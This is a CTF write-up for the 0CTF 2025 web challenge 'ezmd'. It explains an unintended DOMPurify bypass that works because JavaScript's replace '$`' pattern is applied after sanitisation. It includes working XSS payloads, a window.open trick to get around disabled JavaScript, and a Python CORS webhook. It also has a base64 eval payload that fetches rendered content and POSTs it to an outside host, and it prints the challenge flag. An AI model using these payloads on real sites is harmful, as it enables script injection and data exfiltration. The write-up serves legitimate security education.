---
title: "ezmd - 0CTF 2025"
category: "stego"
subcategory: "file-format"
type: "writeup"
tags: ["stego", "polyglot", "unintended", "web", "cors", "base64", "eval", "file-format", "0ctf", "0ctf-2025", "2025", "ctf-writeup"]
summary: "Note that this is an unintended solution."
source:
  name: "CTFtime writeup #40529"
  url: "https://ctftime.org/writeup/40529"
original_source: "https://cyber-man.pl/0ctf-2025-ezmd-web"
ctf:
  name: "0CTF 2025"
  year: 2025
  challenge: "ezmd"
---

## Metadata

- **CTF:** 0CTF 2025
- **Task:** ezmd
- **Author team:** justCatTheFish
- **CTFtime tags:** polyglot, unintended, web
- **CTFtime:** <https://ctftime.org/writeup/40529>
- **Original writeup:** <https://cyber-man.pl/0ctf-2025-ezmd-web>

---
Note that this is an unintended solution. If you'd like to see author's write-up, go [here](<https://github.com/MXWXZ/my-ctf-challenges/tree/main/tctf-2025/ezmd>).

\---

# Video write-up: [<https://youtu.be/mniM5H5xpKw>](<https://youtu.be/mniM5H5xpKw>)  
# Original write-up: [<https://cyber-man.pl/0ctf-2025-ezmd-web>](<https://cyber-man.pl/0ctf-2025-ezmd-web>)

\---

## tl;dr

1\. bypass dom purify for `fname` parameter with `replacement` manipulation  
2\. bypass `setJavaScriptEnabled(false)` by opening an iframe which opens the first page with js enabled  
3\. send to our webhook `img.png`  
4\. include the flag as an iframe in the `content` param, bypassing dompurify having mixed interpreters syntax  
5\. send the included flag with js enabled to our webhook

\---

## The Challenge

The main functionality of the challenge was to render markdown as an image. To obtain the flag, one has to read it from the server that is doing the rendering.

The render function does as follows:

1\. Reads `content` and `fname` from request body  
2\. Sanitizes both of them with the use of latest `isomorphic-dompurify`:

```js  
const cleanFname = DOMPurify.sanitize(fname);  
const cleanContent = DOMPurify.sanitize(content);  
```

3\. The bot opens browser in a local vscode server page  
4\. The bot opens our markdown and renders it as a png in that vscode server session  
5\. Then back again the server creates a `index.html` file based on `result.html` template file that looks like this:

```html

<html lang="zh">  
<head>  
<meta charset="UTF-8" />  
<title>My markdown renderer</title>  
</head>

<body>  
<h1>My md renderer</h1>  


{filename}

  
![](https://ctftime.org/img.png)  
</body>  
</html>  
``` 

by calling javascript's `.replace` on the `{filename}` which is sanitized previously by the dompurify:

```js  
let data = fs  
.readFileSync("static/result.html", "utf-8")  
.replace("{filename}", fname);  
```

6\. A new browser page is initialized  
7\. JavaScript is disabled on it with puppeeter's `setJavaScriptEnabled(false)`:

```js  
await page.setJavaScriptEnabled(false);  
```

8\. The bot visits this `index.html` that displays the image and the name for five seconds and closes the page

### Unintended solution walkthrough

When I saw the combination of DOM Purify and the javascript's replace function after sanitization, I instantly remembered a challenge I made in the past for [pingCTF 2023](<https://ctftime.org/event/1987/>) that revolved just about that specific setup. You can download it [here](<https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-ezmd/0b2b2726408eb1f3effd00b0bcb1d717.zip>) and try your best - maybe reading this write-up will help you find the vulnerability. On pingCTF 2023 it had 0 solves.

It had the exact same pattern:

1\. sanitize the variables  
2\. call javascript replace on them  
3\. render them as raw html to the bot, thinking they are safe...

...even though the sanitization was made <ins>before</ins> the `.replace` data manipulation.

I'm pretty confident that most people think that the `replace` / `replaceAll` functions switch the value of one string to another in some string, like:

```js  
const v1 = "a";  
const v2 = v1.replace("a", "b");  
console.log(v2); // b  
```

which is true, however the second argument, stating what should the first one called <ins>the pattern</ins> be replaced with, **is not a string**. It's called the [replacement](<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#replacement>). And that replacement can be either a function _(that doesn't help us)_, or a string, with [a number of special replacement patterns](<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement).:>

![replacement patterns table](<https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-ezmd/replacement-patterns.webp>)

The most useful ones for us for such sanitization bypass being:

```  
$` <\--- Replaces with content before matched string  
$' <\--- Replaces with content after matched string  
```

A simple example helps illustrate how this works in practice. Here we replace the `B` character in two cases where it has content before and after it.

![example of replace patterns](<https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-ezmd/replacement-patterns-use-case.webp>)

As you can see, the values before/after were inserted in the place where `B` was found.

Knowing that such mechanism in JavaScript exists, we can start to try and bypass DOM Purify sanitization, by including _something_ that is not evil payload, but some widely accepted pure string, like `src` of an img. We can test whether it's accepted with a simple node js script importing the `isomorphic-dompurify`, sanitizing the payload and outpuPting the sanitized one:

```js  
const DOMPurify = require("isomorphic-dompurify");

const payload = `![](https://ctftime.org/something)`;

const cleanPayload = DOMPurify.sanitize(payload);

console.log(cleanPayload); // ![](https://ctftime.org/something)  
```

In that exact way, I started trying to inject my javascript _(not knowing at the time, that javascript was disabled on the page)_. with the replacement trick, and when trying to sanitize a payload hidden in the src string, dompurify let it pass through:

```html  
![](https://ctftime.org/abc123$`<img src=x onerror=alert\(1\)456def>)  
```

We can test the payloads fully with template and the replace call being in the poc:

```js  
const DOMPurify = require("isomorphic-dompurify");

const template = `

<html lang="zh">

<head>  
<meta charset="UTF-8">  
<title>My markdown renderer</title>  
</head>

<body>  
<h1>My md renderer</h1>  


{filename}

  
![](https://ctftime.org/img.png)  
</body>

</html>  
`;

const payload = `![](https://ctftime.org/abc123$\\`<img src=x onerror=alert\(1\)>)`;  
const cleanPayload = DOMPurify.sanitize(payload);  
console.log("dompurify surrendered:", payload === cleanPayload);

let data = template.replace("{filename}", cleanPayload);  
console.log(data);  
```

The above code when executed logged the following:

```  
@tomek ➜ poc-replace node poc2.js  
dompurify surrendered: true

<html lang="zh">

<head>  
<meta charset="UTF-8">  
<title>My markdown renderer</title>  
</head>

<body>  
<h1>My md renderer</h1>  


![](https://ctftime.org/abc123<br /><!DOCTYPE html><br /><html lang=)

<head>  
<meta charset="UTF-8">  
<title>My markdown renderer</title>  
</head>

<body>  
<h1>My md renderer</h1>  


![](https://ctftime.org/x)">

  
![](https://ctftime.org/img.png)  
</body>

</html>

@tomek ➜ poc-replace  
```

which when saved to a `poc2.html` file and opened in the browser, executes the `alert` function:

![poc showing alert call](<https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-ezmd/alert-1-poc.webp>)

When I tried to submit to my webhook, the `img.png` using javascript <ins>obviously</ins> it didn't arrive, because of `page.setJavaScriptEnabled(false);`. However, the javascript was disabled for that particular page, which means if we would manage to open a new one on the same url, <ins>it</ins> would have the javascript default behaviour which is to be enabled, and having the dom purify's sanitization already bypassed, we could create anything on the website.

Submitting an iframe _(which would normally be blocked by DOM Purify, but we have it bypassed at this point)_ that just have `window.open` call achieves exactly that. After the iframe itself, we can execute our javascript. Note that this would be recursively calling itself, as new page opens the same one etc. so make sure your webhook html is not rate-limited, and preferably host your own.

```html

<html lang="en">  
<head>  
<meta charset="UTF-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1.0" />  
<title>Document</title>  
</head>  
<body>  
<script>  
window.open("http://www/index.html");  
</script>  
</body>  
</html>  
```

To create your own webhook, you can use a simple HTTP server with CORS being enabled, having GET respond with the above html, and the POST saving the data on your disk.

```python  
from http.server import HTTPServer, BaseHTTPRequestHandler

HTML_CONTENT = """  
<html lang="en">  
<head>  
<meta charset="UTF-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1.0" />  
<title>Document</title>  
</head>  
<body>  
<script>  
window.open("http://www/index.html");  
</script>  
</body>  
</html>"""

class CORSRequestHandler(BaseHTTPRequestHandler):  
def end_headers(self):  
self.send_header('Access-Control-Allow-Origin', '*')  
self.send_header('Access-Control-Allow-Methods', '*')  
self.send_header('Access-Control-Allow-Headers', '*')  
super().end_headers()

def do_OPTIONS(self):  
self.send_response(204)  
self.end_headers()

def do_GET(self):  
self.send_response(200)  
self.send_header('Content-Type', 'text/html')  
self.end_headers()  
self.wfile.write(HTML_CONTENT.encode('utf-8'))

def do_POST(self):  
content_length = int(self.headers['Content-Length'])  
body = self.rfile.read(content_length)  
with open("received_blob.bin", "wb") as f:  
f.write(body)  
with open("a.png", "wb") as f:  
f.write(body)  
self.send_response(200)  
self.end_headers()

if __name__ == '__main__':  
server = HTTPServer(('0.0.0.0', 1337), CORSRequestHandler)  
server.serve_forever()  
```

The whole payload can be constructed and executed by `eval(atob(<base64>))`'ing our javascript code, which can be easily and reproducibly be done by having another javascript create it. The code executed just fetches the `img.png` _(this is the rendered markdown)_ and pushes it to our webhook.

```js  
const webhookUrl = "<http://web.cyber-man.pl:1337>"; // your website hosting the python server  
const js = `  
const main = async () =>{  
const response = await fetch("/img.png");  
const blb = await response.blob();  
await fetch("${webhookUrl}", {  
method: "POST",  
body: blb,  
headers: { "content-type": "image/png" }  
});  
}  
main();  
`;

const based = btoa(js);  
const fname = `![](https://ctftime.org/asd123$\\`asd1232<iframe src='${webhookUrl}'></iframe><img src=x onerror=eval\(atob\('${based}'\)\)>)'`;  
console.log(fname);  
```

So now it's the time to include the flag within the `img.png` by markdown file inclusion, which can be simply done with `<iframe src=/file></iframe>`. As I mentioned, dom purify doesn't allow iframes, however the bypass is easier this time, as we can just type only markdown-friendly, and not html/js syntax. Here are two codeblocks, that showcase how does the html see this payload, and how does markdown:

html:

````html  
```  
<h1>  
![](https://ctftime.org/<br />a<br />```</p><p><iframe src=/flag><br /></iframe></p><p>)  
</h1>  
````

markdown:

````md  
```  
<h1>![](https://ctftime.org/<br />a<br />```</p><p><iframe src=/flag><br /></iframe></p><p>)  
````

As you can see the html treats the iframe part as part of the string, and markdown as valid tag.

Having that all connected, and submitting the `fname` as the webhook caller and the `content` as the markdown with flag inclusion, we get the flag from the server:

![picture of original flag we got](<https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-ezmd/flag.png>)

```  
0ctf{u_ar3_x33_k1n9}  
```
